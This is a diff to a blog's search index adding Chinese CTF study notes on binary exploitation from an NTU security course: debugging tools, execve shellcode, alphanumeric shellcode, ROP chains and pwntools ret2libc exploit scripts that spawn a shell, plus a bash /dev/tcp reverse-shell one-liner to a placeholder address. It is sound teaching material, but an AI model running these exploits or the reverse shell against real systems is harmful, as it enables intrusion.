@@ -1,6 +1,120 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>NTU STCS 2016学习笔记 0x01 Intro</title>
+    <url>/2020/08/23/ntu-stcs-2016-w3/</url>
+    <content><![CDATA[<p>栈溢出(StackOverflow)入门工具介绍</p>
+<a id="more"></a>
+
+<h2 id="objdump"><a href="#objdump" class="headerlink" title="objdump"></a>objdump</h2><p>常用指令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ objdump -T binary</span><br><span class="line">$ cat /proc/`pidof binary`/maps</span><br></pre></td></tr></table></figure>
+
+<h2 id="readelf"><a href="#readelf" class="headerlink" title="readelf"></a>readelf</h2><p>分析elf binary header里的一些信息<br>readelf -a | grep STACK 看能否跑shellcode</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ readelf -a ./binary | grep STACK</span><br><span class="line">  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10</span><br></pre></td></tr></table></figure>
+
+<p><strong>trick</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ readelf -a ./binary | grep <span class="string">&#x27; system@&#x27;</span></span><br><span class="line">$ ldd binary</span><br></pre></td></tr></table></figure>
+
+<p><strong>trick:execstack</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ execstack --h</span><br><span class="line">Usage: execstack [OPTION...]</span><br><span class="line">execstack -- program to query or <span class="built_in">set</span> executable stack flag</span><br><span class="line"></span><br><span class="line">  -c, --clear-execstack      Clear executable stack flag bit</span><br><span class="line">  -q, --query                Query executable stack flag bit</span><br><span class="line">  -s, --<span class="built_in">set</span>-execstack        Set executable stack flag bit</span><br><span class="line">  -?, --<span class="built_in">help</span>                 Give this <span class="built_in">help</span> list</span><br><span class="line">      --usage                Give a short usage message</span><br><span class="line">  -V, --version              Print program version</span><br><span class="line">Report bugs to &lt;jakub@redhat.com&gt;.</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="ncat"><a href="#ncat" class="headerlink" title="ncat"></a>ncat</h2><p>建立local service环境，因为你不会再无法debug的情况下直接对remote做事<br>ncat -vc ./binary -kl 127.0.0.1 8888<br>ncat -vc ‘strace -e trace=read ./binary’ -kl ::1 4000</p>
+<hr>
+<h2 id="GNU-GDB"><a href="#GNU-GDB" class="headerlink" title="GNU GDB"></a>GNU GDB</h2><p>layout asm<br>attach [pid]</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope</span><br></pre></td></tr></table></figure>
+
+<p>b,c,si,ni,fin<br>x/3wx,x/7i,x/bx,x/s,p</p>
+<hr>
+<h2 id="技巧-Hook-amp-Patch"><a href="#技巧-Hook-amp-Patch" class="headerlink" title="技巧 Hook&amp;Patch"></a>技巧 Hook&amp;Patch</h2><p>当binary文件有alarm时关掉alarm</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sed -i s/alarm/isnan/g ./binary</span><br><span class="line">$ vim ./binary</span><br><span class="line">:%s/alarm/isnan/g <span class="comment">#使用isnan函数替换alarm</span></span><br><span class="line">$ ltrace ./binary</span><br><span class="line">__libc_start_main(0x8048480, 1, 0xfffa3ba4, 0x80484c0 &lt;unfinished ...&gt;</span><br><span class="line">isnan(60, 0xffa2ed14, 0xffa2ed1c, 0xf75b2c8b)                   = 0</span><br></pre></td></tr></table></figure>
+
+<p>hook alarm by LD_PRELOAD</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// hook.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">alarm</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> seconds)</span></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, seconds);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ gcc hook.c -o hook.so -shared -fPIC -m32</span><br><span class="line">$ LD_PRELOAD=./hook.so ./binary</span><br></pre></td></tr></table></figure>
+
+<p>LD_SHOW_AUXV</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ncat -vc <span class="string">&#x27;LD_SHOW_AUXV=1 ./level2&#x27;</span> -kl 127.0.0.1 6666</span><br><span class="line">Ncat: Version 7.80 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on 127.0.0.1:6666</span><br><span class="line">Ncat: Connection from 127.0.0.1.</span><br><span class="line">Ncat: Connection from 127.0.0.1:36108</span><br><span class="line"></span><br><span class="line">$ nc 127.0.0.1 6666</span><br><span class="line">AT_SYSINFO:           0xf7f7ab40</span><br><span class="line">AT_SYSINFO_EHDR:      0xf7f7a000</span><br><span class="line">...</span><br><span class="line">AT_PAGESZ:            4096</span><br><span class="line">AT_CLKTCK:            100</span><br><span class="line">AT_PHDR:              0x8048034</span><br><span class="line">AT_PHENT:             32</span><br><span class="line">AT_PHNUM:             9</span><br><span class="line">AT_BASE:              0xf7f7b000 <span class="comment">#librarybase</span></span><br><span class="line">AT_FLAGS:             0x0</span><br><span class="line">AT_ENTRY:             0x8048350</span><br><span class="line">...</span><br><span class="line">AT_SECURE:            0</span><br><span class="line">AT_RANDOM:            0xffd88bcb <span class="comment">#stackout canary</span></span><br><span class="line">AT_HWCAP2:            0x0</span><br><span class="line">...</span><br><span class="line">AT_EXECFN:            /bin/sh</span><br><span class="line">AT_PLATFORM:          x86_64</span><br><span class="line">Input:</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="qira"><a href="#qira" class="headerlink" title="qira"></a><a href="https://qira.me/">qira</a></h2><p>非常好用的gdb动态调试工具，部署略</p>
+<blockquote>
+<p>Ubuntu 14.04 and 16.04 supported out of the box.<br>18.04 is having a problem with building QEMU<br>See forked QEMU source at <a href="https://github.com/geohot/qemu/tree/qira">https://github.com/geohot/qemu/tree/qira</a> to fix.</p>
+</blockquote>
+<p><a href="https://github.com/geohot/qira">使用方法</a></p>
+<p>开启指令 python qira.py -s ./binary</p>
+<hr>
+<h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure>
+
+<p><a href="http://docs.pwntools.com/en/stable/">Documentation</a></p>
+<h2 id="nasm"><a href="#nasm" class="headerlink" title="nasm"></a>nasm</h2><p>X86编译工具，编译shellcode使用</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nasm -felf32 test.asm -o test.o</span><br><span class="line">ld -melf_i386 test.o -o <span class="built_in">test</span></span><br><span class="line">objcopy -O binary test.o test.bin</span><br><span class="line">objdump -b binary -m i386 -D test.bin</span><br></pre></td></tr></table></figure>
+
+<p>e.g</p>
+<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">[<span class="meta">section</span> .data]</span><br><span class="line"><span class="meta">global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">  <span class="keyword">jmp</span> sh</span><br><span class="line"><span class="symbol">se:</span></span><br><span class="line">  <span class="keyword">pop</span> <span class="built_in">ebx</span></span><br><span class="line">  <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">11</span></span><br><span class="line">  <span class="keyword">xor</span> <span class="built_in">ecx</span>, <span class="built_in">ecx</span></span><br><span class="line">  <span class="keyword">xor</span> <span class="built_in">edx</span>, <span class="built_in">edx</span></span><br><span class="line">  <span class="keyword">int</span> <span class="number">0x80</span></span><br><span class="line"><span class="symbol">sh:</span></span><br><span class="line">  <span class="keyword">call</span> se</span><br><span class="line">  <span class="built_in">db</span> <span class="string">&#x27;/bin/sh&#x27;</span>, <span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>注：使用mov eax, 0赋值时可能会出错</strong></p>
+<p>错误代码：</p>
+<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">se:</span></span><br><span class="line">  <span class="keyword">pop</span> <span class="built_in">ebx</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">11</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">ecx</span>, <span class="built_in">ecx</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">edx</span>, <span class="built_in">edx</span></span><br><span class="line">  <span class="keyword">int</span> <span class="number">0x80</span></span><br></pre></td></tr></table></figure>
+
+<p>用作payload时会产生0x00字符遇到read()的情况会被截断</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ xxd test.bin</span><br><span class="line">00000000: eb0c 5bb8 0b00 0000 89c9 89d2 cd80 e8ef  ..[.............</span><br><span class="line">00000010: ffff ff2f 6269 6e2f 7368 00              .../bin/sh.</span><br></pre></td></tr></table></figure>
+
+<p><strong><a href="http://shell-storm.org/shellcode/files/syscalls.html">Linux System Call Table</a></strong></p>
+<hr>
+<h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><ul>
+<li>不能有\0</li>
+<li>可以用call + pop的方式拿到shellcode address</li>
+<li>长度不足时，如果还能输入可以make read函数</li>
+</ul>
+<h2 id="alphanumeric-Shellcode"><a href="#alphanumeric-Shellcode" class="headerlink" title="alphanumeric Shellcode"></a>alphanumeric Shellcode</h2><blockquote>
+<p>只能用0-9写shellcode</p>
+</blockquote>
+<p>int 0x80 = \xcd\x80，如何用数字做sys_call？</p>
+<p><strong>自修改</strong></p>
+<p>| decoder1 | encoded decoder2 | encoded shellcode |</p>
+<div class='spoiler collapsed'>
+    <div class='spoiler-title'>
+        Opcode Table
+    </div>
+    <div class='spoiler-content'>
+        <p>a   61                      popa<br>b   62 41 42                bound  eax, QWORD PTR [ecx+0x42]<br>c   63 41 42                arpl   WORD PTR [ecx+0x42], ax<br>d   64 41                   fs inc ecx<br>e   65 41                   gs inc ecx<br>f   66 41                   inc    cx<br>g   67 41                   addr16 inc ecx<br>h   68 41 42 43 44          push   0x44434241<br>i   69 41 42 43 44 45 46    imul   eax, DWORD PTR [ecx+0x42], 0x46454443<br>j   6a 41                   push   0x41<br>k   6b 41 42 43             imul   eax, DWORD PTR [ecx+0x42], 0x43<br>l   6c                      ins    BYTE PTR es:[edi], dx<br>m   6d                      ins    DWORD PTR es:[edi], dx<br>n   6e                      outs   dx, BYTE PTR ds:[esi]<br>o   6f                      outs   dx, DWORD PTR ds:[esi]<br>p   70 41                   jo     0x43<br>q   71 41                   jno    0x43<br>r   72 41                   jb     0x43<br>s   73 41                   jae    0x43<br>t   74 41                   je     0x43<br>u   75 41                   jne    0x43<br>v   76 41                   jbe    0x43<br>w   77 41                   ja     0x43<br>x   78 41                   js     0x43<br>y   79 41                   jns    0x43<br>z   7a 41                   jp     0x43<br>A   41                      inc    ecx<br>B   42                      inc    edx<br>C   43                      inc    ebx<br>D   44                      inc    esp<br>E   45                      inc    ebp<br>F   46                      inc    esi<br>G   47                      inc    edi<br>H   48                      dec    eax<br>I   49                      dec    ecx<br>J   4a                      dec    edx<br>K   4b                      dec    ebx<br>L   4c                      dec    esp<br>M   4d                      dec    ebp<br>N   4e                      dec    esi<br>O   4f                      dec    edi<br>P   50                      push   eax<br>Q   51                      push   ecx<br>R   52                      push   edx<br>S   53                      push   ebx<br>T   54                      push   esp<br>U   55                      push   ebp<br>V   56                      push   esi<br>W   57                      push   edi<br>X   58                      pop    eax<br>Y   59                      pop    ecx<br>Z   5a                      pop    edx<br>0   30 41 42                xor    BYTE PTR [ecx+0x42], al<br>1   31 41 42                xor    DWORD PTR [ecx+0x42], eax<br>2   32 41 42                xor    al, BYTE PTR [ecx+0x42]<br>3   33 41 42                xor    eax, DWORD PTR [ecx+0x42]<br>4   34 41                   xor    al, 0x41<br>5   35 41 42 43 44          xor    eax, 0x44434241<br>6   36 41                   ss inc ecx<br>7   37                      aaa<br>8   38 41 42                cmp    BYTE PTR [ecx+0x42], al<br>9   39 41 42                cmp    DWORD PTR [ecx+0x42], eax</p>
+
+    </div>
+</div>
+
+<p>Register赋值</p>
+<pre><code>PQRSTUVWa
+0:  50      push  eax
+1:  51      push  ecx
+2:  52      push  edx  
+3:  53      push  ebx
+4:  54      push  esp
+5:  55      push  ebp
+6:  56      push  esi
+7:  57      push  edi
+8:  61      popa</code></pre>
+<p>自修改shellcode</p>
+<pre><code>jDX0A1
+0:  6a 44       push  0x44
+2:  58          pop   eax
+3:  30 41 31    xor   BYTE PTR [ecx+0x31],al</code></pre>
+<p>eax赋值</p>
+<pre><code>jDX4C
+0:  6a 44       push  0x44
+2:  58          pop   eax
+3:  34 43       xor   al,0x43</code></pre>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>NTU STCS 2016学习笔记 0x02 ROP</title>
     <url>/2020/08/25/ntu-stcs-2016-w4/</url>
     <content><![CDATA[<p><strong>week4 shellcode rop</strong></p>
@@ -50,6 +164,130 @@
 <li>migrate后的空间要足够</li>
 </ul>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gadget1 = <span class="number">0x8048898</span></span><br><span class="line"><span class="comment"># gadget1 has gets() and leave_ret</span></span><br><span class="line"><span class="comment"># 8048898:       50                      push   eax</span></span><br><span class="line"><span class="comment"># 8048899:       e8 e2 69 00 00          call   804f280 &lt;_IO_gets&gt;</span></span><br><span class="line"><span class="comment"># 804889e:       83 c4 10                add    esp,0x10</span></span><br><span class="line"><span class="comment"># 80488a1:       90                      nop</span></span><br><span class="line"><span class="comment"># 80488a2:       c9                      leave</span></span><br><span class="line"><span class="comment"># 80488a3:       c3                      ret</span></span><br><span class="line">migration = [</span><br><span class="line">    pop_ebp_ret,</span><br><span class="line">    buf - <span class="number">4</span>,  <span class="comment">#leave会pop ebp，所以要控制到buf-4位置</span></span><br><span class="line">    pop_eax_ret,</span><br><span class="line">    buf,</span><br><span class="line">    gadget1,</span><br><span class="line">]</span><br><span class="line">rop = [</span><br><span class="line">    pop_eax_ret,</span><br><span class="line">    <span class="number">0xb</span>,</span><br><span class="line">    pop_ebx_ret,</span><br><span class="line">    buf + <span class="number">9</span> * <span class="number">4</span>,  <span class="comment">#ropchain一共有9*4bytes</span></span><br><span class="line">    pop_ecx_ret,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    pop_edx_ret,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    int_0x80_ret</span><br><span class="line">]</span><br><span class="line">payload1 = <span class="string">&#x27;A&#x27;</span> * offset + <span class="string">&#x27;&#x27;</span>.join(map(p32, migration))</span><br><span class="line">payload2 = <span class="string">&#x27;&#x27;</span>.join(map(p32, rop)) + <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br></pre></td></tr></table></figure>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>NTU STCS 2016学习笔记 0x03 ROP2</title>
+    <url>/2020/08/29/ntu-stcs-2016-w5/</url>
+    <content><![CDATA[<p><strong>week5 rop from ret2text to ret2lib</strong></p>
+<a id="more"></a>
+
+<h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><ul>
+<li><em>跳.plt entry</em></li>
+<li><em>函数参数直接放到接下来的stack</em></li>
+<li><em>用pop-ret处理用过的参数</em></li>
+</ul>
+<p><strong>ROP call function</strong></p>
+<p><img src="w5-ropcall.png" alt="w5-ropcall"></p>
+<h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><ul>
+<li><em>printf,gets,puts等函数所在位置:libc.so.6</em></li>
+<li><em>直接用rop call libc 的system</em></li>
+<li><em>用条件</em><ul>
+<li><em>libc版本或者fuction的offset已知</em></li>
+<li><em>ASLR开启情况</em></li>
+</ul>
+</li>
+</ul>
+<p><strong>Dynamically Linded Elf 动态链接库相关操作</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 获取libc路径</span></span><br><span class="line">ldd ./binary</span><br><span class="line"><span class="comment"># 查看libc中的相对位置</span></span><br><span class="line"><span class="comment"># trick 使用 | grep &#x27; system@&#x27;来查看想找的symbol</span></span><br><span class="line">readelf -s /lib32/libc.so.6 | grep <span class="string">&#x27; system@&#x27;</span></span><br><span class="line"><span class="comment"># 指定加载的libc位置</span></span><br><span class="line">LD_LIBRARY_PATH=./path/to/libc</span><br></pre></td></tr></table></figure>
+
+<p><strong>Function Lazy Binding</strong></p>
+<p><em>library在binary执行时才加载，第一次call function时解析函数位置填入.got.plt</em></p>
+<p><strong>推算libc base addr</strong></p>
+<ul>
+<li><em>函数在libc的相对位置不变</em><ul>
+<li><em>使用readelf得知__libc_start_main和system在libc的相对位置</em></li>
+</ul>
+</li>
+<li><em>使用任意输入函数print出__libc-start_main的.got内容，推算system在内存的addr</em><ul>
+<li><em>用rop构造puts(__libc_start_main@got)</em></li>
+<li><em>要leak的got entry,对应的function必须已经被call过</em></li>
+</ul>
+</li>
+<li><em>前提：已有或已知远端libc.so.6版本</em></li>
+</ul>
+<p><strong>Libc Data Base</strong></p>
+<ul>
+<li><p><em>已知两个function的address时可以在libcdb里找对应的版本</em></p>
+<ul>
+<li><em><del>✘网站：libcdb.com:the libc data base</del></em></li>
+<li><em>✘网站：<a href="https://libc.nullbyte.cat/">libc.nullbyte.cat</a></em></li>
+<li><em>✔使用<a href="https://github.com/lieanu/LibcSearcher">LibcSearcher</a></em></li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型</span></span><br><span class="line">obj = LibcSearcher(<span class="string">&quot;fgets&quot;</span>, <span class="number">0X7ff39014bd90</span>)</span><br><span class="line"></span><br><span class="line">obj.dump(<span class="string">&quot;system&quot;</span>)        <span class="comment">#system 偏移</span></span><br><span class="line">obj.dump(<span class="string">&quot;str_bin_sh&quot;</span>)    <span class="comment">#/bin/sh 偏移</span></span><br><span class="line">obj.dump(<span class="string">&quot;__libc_start_main_ret&quot;</span>)  </span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p><strong>Leak libc base</strong><br><em>一般leak __libc_start_main的地址，通过LibcSearcher获取system与/bin/sh的地址，再跳转回main触发溢出执行system(‘/bin/sh’)</em></p>
+<p><strong>例子：</strong><a href="/uploads/codes/w5/ret2libc3">ret2libc3</a></p>
+<div class='spoiler collapsed'>
+    <div class='spoiler-title'>
+        exp:
+    </div>
+    <div class='spoiler-content'>
+        <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret2libc3 = ELF(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = ret2libc3.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc_start_main_got = ret2libc3.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">main = ret2libc3.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;leak libc_start_main_got addr and return to main again&quot;</span></span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span> * <span class="number">112</span>, puts_plt, main, libc_start_main_got])</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Can you find it !?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;get the related addr&quot;</span></span><br><span class="line">libc_start_main_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>, libc_start_main_addr)</span><br><span class="line">libcbase = libc_start_main_addr - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;get shell&quot;</span></span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span> * <span class="number">104</span>, system_addr, <span class="number">0xdeadbeef</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><strong>trick:开启reverse tcp shell(web同时适用)</strong><br>system(“bash -c ‘bash -i &gt;&amp; /dev/tcp/to.your.ip.addr/31337 0&gt;&amp;1’”)</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># system(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/127.0.0.1/31337 0&gt;&amp;1&#x27;&quot;)</span></span><br><span class="line">nc -vlp 31337</span><br></pre></td></tr></table></figure>
+
+    </div>
+</div>
+
+<h1 id="ROP-for-x86-64"><a href="#ROP-for-x86-64" class="headerlink" title="ROP for x86-64"></a>ROP for x86-64</h1><p><strong>64-bin ROP</strong></p>
+<ul>
+<li><em>syscall 要用rax,rdi,rsi,rdx,rcx,r8,r9,syscall</em></li>
+<li><em>Function call参数传递适用寄存器而不是栈 rdi,rsi,rdx,rcx,r8,r9</em></li>
+<li><em>需要用pop-ret控制register，再接function address</em></li>
+</ul>
+<p><strong>64-bit register</strong></p>
+<ul>
+<li><em>rax,rcx,rdx,rbx,rsp,rbp,rsi,rdi</em></li>
+<li><em>r8-r15是用前8个加上rex prefix来表示</em></li>
+<li><em>r12-r15是callee saved，所以pop r12 - r15在function return前很常见</em></li>
+<li><em>pop r14 = 415e / pop rsi = 5e</em></li>
+<li><em>pop r15 = 415f / pop rdi = 5f</em></li>
+</ul>
+<p><strong>ROPgadget</strong><br>ROPgadget预设的搜索长度对64位来说可能不太够，需要增加–depth</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary ./binary --depth 100</span><br></pre></td></tr></table></figure>
+
+<p><strong>通用gadget</strong></p>
+<ul>
+<li><em>64bit rop需要gadget控制参数</em></li>
+<li><em>gcc的程序中有一些片段一定会有，可以用来做rop，构造ret2lib不是问题</em></li>
+</ul>
+<p><img src="w5-x64-rdi-rsi.png" alt="w5-x64-rdi-rsi"></p>
+<p><img src="w5-x64-rdi.png" alt="w5-x64-rdi"></p>
+<p><img src="w5-x64-rax.png" alt="w5-x64-rax"></p>
+<p><img src="w5-x64-rcx.png" alt="w5-x64-rcx"></p>
+<p><img src="w5-x64-rax2mem.png" alt="w5-x64-rax2mem"></p>
+<p><strong>De-ASLR with ROP</strong><br><em>Calculate Runction Address without Information Leakage</em></p>
+<p><img src="w5-deaslr.png" alt="w5-deaslr"></p>
+<p><img src="w5-dl-rtresov.png" alt="w5-dl-rtresov"></p>
+<p><strong>Linux 常用保护机制开关方法</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cannary 栈保护</span></span><br><span class="line">gcc -o <span class="built_in">test</span> test.c  <span class="comment"># 默认情况下，不开启Canary保护</span></span><br><span class="line">gcc -fno-stack-protector -o <span class="built_in">test</span> test.c  <span class="comment">#禁用栈保护</span></span><br><span class="line">gcc -fstack-protector -o <span class="built_in">test</span> test.c  <span class="comment">#启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span></span><br><span class="line">gcc -fstack-protector-all -o <span class="built_in">test</span> test.c  <span class="comment">#启用堆栈保护，为所有函数插入保护代码</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># FORTIFY 检查是否存在缓冲区溢出的错误</span></span><br><span class="line">gcc -o <span class="built_in">test</span> test.c  <span class="comment">#默认情况下，不会开这个检查</span></span><br><span class="line">gcc -D_FORTIFY_SOURCE=1 -o <span class="built_in">test</span> test.c  <span class="comment">#较弱的检查</span></span><br><span class="line">gcc -D_FORTIFY_SOURCE=2 -o <span class="built_in">test</span> test.c  <span class="comment">#较强的检查</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># NX（DEP）No-eXecute</span></span><br><span class="line">gcc -o <span class="built_in">test</span> test.c  <span class="comment">#默认情况下，开启NX保护</span></span><br><span class="line">gcc -z execstack -o <span class="built_in">test</span> test.c  <span class="comment">#禁用NX保护</span></span><br><span class="line">gcc -z noexecstack -o <span class="built_in">test</span> test.c  <span class="comment">#开启NX保护</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PIE（ASLR）</span></span><br><span class="line"><span class="comment"># liunx下关闭PIE的命令</span></span><br><span class="line">sudo -s <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line"><span class="comment"># gcc编译命令</span></span><br><span class="line">gcc -o <span class="built_in">test</span> test.c  <span class="comment">#默认情况下，不开启PIE</span></span><br><span class="line">gcc -fpie -pie -o <span class="built_in">test</span> test.c  <span class="comment">#开启PIE，此时强度为1</span></span><br><span class="line">gcc -fPIE -pie -o <span class="built_in">test</span> test.c  <span class="comment">#开启PIE，此时为最高强度2</span></span><br><span class="line">gcc -fpic -o <span class="built_in">test</span> test.c  <span class="comment">#开启PIC，此时强度为1，不会开启PIE</span></span><br><span class="line">gcc -fPIC -o <span class="built_in">test</span> test.c  <span class="comment">#开启PIC，此时为最高强度2，不会开启PIE</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># RELRO</span></span><br><span class="line">gcc编译：</span><br><span class="line"></span><br><span class="line">gcc -o <span class="built_in">test</span> test.c  <span class="comment">#默认情况下，是Partial RELRO</span></span><br><span class="line">gcc -z norelro -o <span class="built_in">test</span> test.c  <span class="comment">#关闭，即No RELRO</span></span><br><span class="line">gcc -z lazy -o <span class="built_in">test</span> test.c  <span class="comment">#部分开启，即Partial RELRO</span></span><br><span class="line">gcc -z now -o <span class="built_in">test</span> test.c  <span class="comment">#全部开启，即full RELRO</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>例子:</strong><a href="/uploads/codes/w5/gets">gets</a> <a href="/uploads/codes/w5/libc.so.6">libc.so.6</a></p>
+<div class='spoiler collapsed'>
+    <div class='spoiler-title'>
+        exp:
+    </div>
+    <div class='spoiler-content'>
+        <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">  p = process(<span class="string">&#x27;./gets&#x27;</span>)</span><br><span class="line">  <span class="comment"># p = remote(&#x27;127.0.0.1&#x27;, 4000)</span></span><br><span class="line">  libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  p = remote(<span class="string">&#x27;10.21.13.69&#x27;</span>, <span class="number">10010</span>)</span><br><span class="line">  libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./gets&#x27;</span>)</span><br><span class="line">g = <span class="keyword">lambda</span> x: next(elf.search(asm(x)))</span><br><span class="line">system_offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">gets_offset = libc.symbols[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">offset = system_offset - gets_offset</span><br><span class="line"><span class="keyword">if</span> offset &lt; <span class="number">0</span>:</span><br><span class="line">  offset &amp;= <span class="number">0xffffffff</span></span><br><span class="line">gets_plt = elf.plt[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">gets_got = elf.got[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">libc_csu_init = elf.symbols[<span class="string">&#x27;__libc_csu_init&#x27;</span>]</span><br><span class="line">pop_rsp_r13_r14_r15_ret = g(<span class="string">&#x27;pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret&#x27;</span>)</span><br><span class="line">pop_rbp_ret = g(<span class="string">&#x27;pop rbp ; ret&#x27;</span>)</span><br><span class="line">pop_rdi_ret = g(<span class="string">&#x27;pop rdi ; ret&#x27;</span>)</span><br><span class="line">pop_r15_ret = g(<span class="string">&#x27;pop r15 ; ret&#x27;</span>)</span><br><span class="line">pop_rsi_r15_ret = g(<span class="string">&#x27;pop rsi ; pop r15 ; ret&#x27;</span>)</span><br><span 